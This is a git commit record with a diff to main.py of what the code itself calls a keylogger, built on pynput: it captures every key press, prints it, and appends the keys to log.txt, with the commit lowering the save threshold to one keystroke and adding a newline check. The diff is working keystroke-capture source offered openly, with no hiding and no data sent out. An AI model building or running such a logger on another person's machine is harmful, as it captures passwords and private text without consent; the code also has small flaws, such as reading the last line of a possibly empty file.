63b8f5cb0cf49cd930be30438ce40201f6b35b2d
Eric <erichklee43@gmail.com>
2022-04-08 19:01:06 +1000

    added feature: dont add new line after new line in file

--- main.py
+++ main.py
@@ -36,34 +36,47 @@ from pynput.keyboard import Key, Listener # for keylogs
 #                                                                      #
 ########################################################################
 
+# storing keys in file
 count = 0
 keys = []
 
-# The Code that Appends the Key that is Press and Save
+# Function for when key is pressed
 def on_press(key):
     global keys, count
 
-    # counts the number of keys stored in list then saves it in file
+    # storing keys and increasing count in file
     keys.append(key)
     count += 1
     print("{0} pressed".format(key))
 
-    if count >= 5:
+    # if count >= 5, call write_file to save keys into a file
+    if count >= 1:
         count = 0
         write_file(keys)
         keys = []
 
+# Function to write the keys list into a file
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
             clean_key = str(key).replace("'","")
-            # if there is a space, make a newline
-            if k.find("space") > 0:
+            # if space key is pressed and the last line in file is not a newline enter new line
+            if (clean_key.find("space") > 0) and not is_last_new_line_file():
                 f.write('\n')
             # if key doesnt exist, then -1 will be written
-            elif k.find("Key") == -1:
+            elif clean_key.find("Key") == -1:
                 f.write(clean_key)
+            prev_key = clean_key
 
+# checks if the last line in the file is a new line
+def is_last_new_line_file():
+    with open('log.txt', 'r') as f:
+        last_line = f.readlines()[-1]
+        if last_line == '\n':
+            return True
+        return False
+
+# Failsafe to break keylogger file - currently set at esc key
 def on_release(key):
     if key == Key.esc:
         return False
